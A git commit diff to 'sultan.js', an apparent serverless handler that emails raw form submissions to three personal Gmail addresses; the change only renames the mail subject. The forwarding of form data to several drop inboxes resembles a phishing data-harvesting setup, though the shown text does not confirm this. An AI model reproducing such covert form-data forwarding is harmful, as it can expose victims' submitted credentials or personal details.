9ca8af85ca3720d33851622a9f68d772e8db107f
zm9807350 <zm9807350@gmail.com>
2026-03-18 15:57:24 +0500

    Update sultan.js

--- sultan.js
+++ sultan.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
       to: "linkquarry@gmail.com,fahadali123gg@gmail.com,berlin230589dbdi@gmail.com",
-      subject: "sultan",
+      subject: "Fahad",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
